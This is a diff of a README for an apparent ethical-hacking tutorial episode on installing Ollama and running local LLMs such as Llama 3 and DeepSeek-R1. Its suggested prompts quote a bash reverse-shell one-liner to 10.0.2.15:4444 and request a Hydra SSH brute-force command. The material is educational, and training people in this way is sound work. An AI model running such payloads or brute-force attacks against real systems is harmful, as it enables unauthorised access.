@@ -34,50 +34,50 @@ Run the automated installation script:
 ```bash
 curl -fsSL [https://ollama.com/install.sh](https://ollama.com/install.sh) | sh
 ```
-Step 3: Verify Ollama Service
+### Step 3: Verify Ollama Service
 Check if the background service is active and running:
 ```bash
 systemctl status ollama
 ```
-🧠 Downloading & Running AI Models
-Option A: Meta's Llama 3 (8B) - Recommended for Beginners
+## 🧠 Downloading & Running AI Models
+### Option A: Meta's Llama 3 (8B) - Recommended for Beginners
 ```bash
 ollama run llama3
 ```
-Option B: DeepSeek-R1 (8B) - Reasoning Model
+### Option B: DeepSeek-R1 (8B) - Reasoning Model
 ```bash
 ollama run deepseek-r1:8b
 ```
-💡 Practical Cybersecurity Queries to Try
+## 💡 Practical Cybersecurity Queries to Try
 Once inside the Ollama interactive prompt (>>>), try asking:
 
-Nmap Command Explanation:
+### Nmap Command Explanation:
 
 Explain what the command "nmap -sS -sV -p- -T4 10.0.2.15" does in bullet points.
 
-Hydra Syntax Generation:
+### Hydra Syntax Generation:
 
 Give me a Hydra command to perform SSH brute-force testing on target IP 192.168.1.50 with user "admin".
 
-Bash One-Liner Analysis:
+### Bash One-Liner Analysis:
 
 Explain this payload safely: bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
 
 To exit the Ollama prompt, type /bye and press Enter.
 
-📝 Episode Assignment
+## 📝 Episode Assignment
 Install Ollama and pull llama3 or deepseek-r1.
 
 Ask the AI to explain a complex tcpdump or sqlmap command.
 
 Share your terminal screenshot in our Telegram group or YouTube comments!
 
-🔗 Useful Links & Resources
+## 🔗 Useful Links & Resources
 Watch Full Episode: Ethical Vyaspeeth YouTube Channel
 
 Official Ollama Website: ollama.com
 
 Ollama Model Library: ollama.com/library
 
-⚠️ Legal & Ethical Disclaimer
+## ⚠️ Legal & Ethical Disclaimer
 This material is created for educational purposes only as part of the Ethical Vyaspeeth training curriculum. Always ensure you have explicit written permission before performing penetration testing against any target system.
